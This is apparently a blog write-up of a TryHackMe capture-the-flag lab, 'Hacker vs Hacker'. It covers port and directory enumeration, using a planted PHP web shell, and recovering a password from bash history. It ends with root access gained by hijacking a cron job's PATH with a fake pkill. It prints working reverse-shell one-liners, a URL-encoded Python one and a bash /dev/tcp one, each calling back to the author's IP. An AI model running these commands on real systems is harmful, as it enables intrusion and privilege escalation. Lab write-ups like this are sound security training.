---
title: "TryHackMe: Hacker vs Hacker"
author: cilgin
date: 2025-06-18 02:11:36 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Easy]
pin: true
math: false
mermaid: false
image:
  path: /assets/img/2025-06-18-TryHackMe-Hacker_vs_Hacker/Hacker_vs_Hacker.png
---

# Enumeration

## Nmap Scan

I start with exporting the target machine IP adress as a enviroment variable:

```bash
export IP=10.10.42.44
```

And running `nmap` scan on the target:

```bash
nmap -T4 -n -sC -sV -Pn -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-06-18 12:43 +0300
Nmap scan report for 10.10.42.44
Host is up (0.074s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA)
|   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA)
|_  256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: RecruitSec: Industry Leading Infosec Recruitment
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.66 seconds
```

There are **3** open ports:

- **22** `ssh`
- **80** `http`

## Directory Fuzzing

For further enumeration I'm gonna run `gobuster`.

```bash
❯ gobuster dir -w common.txt -u http://$IP/ -x md,js,html,php,py,css,txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.42.44/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              py,css,txt,md,js,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.hta.py              (Status: 403) [Size: 276]
/.hta.css             (Status: 403) [Size: 276]
/.hta.txt             (Status: 403) [Size: 276]
/.hta.js              (Status: 403) [Size: 276]
/.hta.md              (Status: 403) [Size: 276]
/.hta.html            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htaccess.py         (Status: 403) [Size: 276]
/.htaccess.css        (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htaccess.md         (Status: 403) [Size: 276]
/.htaccess.js         (Status: 403) [Size: 276]
/.htaccess.html       (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htpasswd.html       (Status: 403) [Size: 276]
/.htpasswd.js         (Status: 403) [Size: 276]
/.htpasswd.py         (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htpasswd.css        (Status: 403) [Size: 276]
/.htpasswd.md         (Status: 403) [Size: 276]
/css                  (Status: 301) [Size: 308] [--> http://10.10.42.44/css/]
/cvs                  (Status: 301) [Size: 308] [--> http://10.10.42.44/cvs/]
/dist                 (Status: 301) [Size: 309] [--> http://10.10.42.44/dist/]
/images               (Status: 301) [Size: 311] [--> http://10.10.42.44/images/]
/index.html           (Status: 200) [Size: 3413]
/index.html           (Status: 200) [Size: 3413]
/server-status        (Status: 403) [Size: 276]
/upload.php           (Status: 200) [Size: 552]
Progress: 37912 / 37912 (100.00%)
===============================================================
Finished
===============================================================
```

There is file `/upload.php`{: .filepath} maybe we can use this file.

## Enumerating path's

```bash
curl http://$IP/upload.php
Hacked! If you dont want me to upload my shell, do better at filtering!

<!-- seriously, dumb stuff:

$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) {
  echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
  echo "Success! We will get back to you.";
} else {
  echo "Something went wrong :|";
}
```

Also there is upload section on the page. 
![Desktop View](/assets/img/2025-06-18-TryHackMe-Hacker_vs_Hacker/photo1.png){: width="1044" height="409" }

We can use this file make a reverse shell to the machine.

I used pentestmonkey php reverse shell. With `.php`, `.pdf`, `.pdf.php` and `.php.pdf`. But none of them worked. Maybe we need to do something with this file.

So I back to the directory fuzzing. And fuzzed the cvs directory with .pdf.php extension.

```bash
❯ gobuster dir -w common.txt -u http://$IP/cvs/ -x pdf.php -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.42.44/cvs/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              pdf.php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.hta.pdf.php         (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htaccess.pdf.php    (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htpasswd.pdf.php    (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 26]
/shell.pdf.php        (Status: 200) [Size: 18]
Progress: 9478 / 9478 (100.00%)
===============================================================
Finished
===============================================================
```

And as you can see there is a `/shell.pdf.php`{: .filepath} file.

- We can try making basic php enumeration using:

```bash
curl http://$IP/cvs/shell.pdf.php?cmd=id
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
boom!%
```

We can access the shell.

## Gaining Reverse Shell

- On my machine I runned `nc -lvnp 4444`.

- For target I open with my browser `http://10.10.42.44/cvs/shell.pdf.php?cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.21.206.128%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22sh%22%29%27`
  You can use <revshells.com> for generating reverse shells.

```bash
❯ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.42.44 53822
$ ls
ls
index.html  shell.pdf.php
$ ls -la
ls -la
total 16
drwxr-xr-x 2 www-data www-data 4096 May  5  2022 .
drwxr-xr-x 6 www-data www-data 4096 May  5  2022 ..
-rw-r--r-- 1 www-data www-data   26 May  5  2022 index.html
-rw-r--r-- 1 www-data www-data   47 May  5  2022 shell.pdf.php
$ nope
```

Bro seems to playing with. So I will use enumerate with `curl` instead.

## Enumerating the Filesystem

```bash
❯ curl "http://$IP/cvs/shell.pdf.php?cmd=ls%20-la%20/home"
<pre>total 12
drwxr-xr-x  3 root    root    4096 May  5  2022 .
drwxr-xr-x 19 root    root    4096 May  5  2022 ..
drwxr-xr-x  4 lachlan lachlan 4096 May  5  2022 lachlan
</pre>
```

```bash
❯ curl "http://$IP/cvs/shell.pdf.php?cmd=ls%20-la%20/home/lachlan"
<pre>total 36
drwxr-xr-x 4 lachlan lachlan 4096 May  5  2022 .
drwxr-xr-x 3 root    root    4096 May  5  2022 ..
-rw-r--r-- 1 lachlan lachlan  168 May  5  2022 .bash_history
-rw-r--r-- 1 lachlan lachlan  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 lachlan lachlan 3771 Feb 25  2020 .bashrc
drwx------ 2 lachlan lachlan 4096 May  5  2022 .cache
-rw-r--r-- 1 lachlan lachlan  807 Feb 25  2020 .profile
drwxr-xr-x 2 lachlan lachlan 4096 May  5  2022 bin
-rw-r--r-- 1 lachlan lachlan   38 May  5  2022 user.txt
</pre>
```

```bash
❯ curl "http://$IP/cvs/shell.pdf.php?cmd=cat%20/home/lachlan/.bash_history"
<pre>./cve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
ls -sf /dev/null /home/lachlan/.bash_history
</pre>
```

And we found **lachlan** user's password.

## Connecting the machine using SSH

```bash
❯ ssh lachlan@$IP
lachlan@10.10.42.44's password:
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 18 Jun 2025 10:43:18 AM UTC

  System load:  0.05              Processes:             140
  Usage of /:   25.1% of 9.78GB   Users logged in:       0
  Memory usage: 53%               IPv4 address for ens5: 10.10.42.44
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jun 18 10:41:40 2025 from 10.21.206.128
$ nope
Connection to 10.10.42.44 closed.
```

We still got kicked from the machine. Maybe specifying the shell solve the issue.

```bash
ssh lachlan@$IP /bin/bash
```

And it does. Now we are not kicked from the machine.

```bash
ls -la
ls -la
total 36
drwxr-xr-x 4 lachlan lachlan 4096 May  5  2022 .
drwxr-xr-x 3 root    root    4096 May  5  2022 ..
-rw-r--r-- 1 lachlan lachlan  168 May  5  2022 .bash_history
-rw-r--r-- 1 lachlan lachlan  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 lachlan lachlan 3771 Feb 25  2020 .bashrc
drwxr-xr-x 2 lachlan lachlan 4096 May  5  2022 bin
drwx------ 2 lachlan lachlan 4096 May  5  2022 .cache
-rw-r--r-- 1 lachlan lachlan  807 Feb 25  2020 .profile
-rw-r--r-- 1 lachlan lachlan   38 May  5  2022 user.txt
cat user.txt
thm{*****************************}
```

I see bin folder on the home directory and there is a script file in it. It should be related to cron jobs.

```bash
cat backup.sh
# todo: pita website backup as requested by her majesty
cat /etc/cron.d/persistence
PATH=/home/lachlan/bin:/bin:/usr/bin
# * * * * * root backup.sh
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
```

I think we can inject our pkexec binary with reverse shell. Beacuse we have access to lachlan bin directory.

Create our pkill with reverse shell using this command:

```bash
echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.21.206.128/4444 0>&1'" > pkill;chmod +x pkill
```

And we got reverse shell:

```bash
❯ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.42.44 53902
bash: cannot set terminal process group (28694): Inappropriate ioctl for device
bash: no job control in this shell
root@b2r:~# ls
ls
root.txt
snap
root@b2r:~# cat root.txt
cat root.txt
thm{**********************************}
```
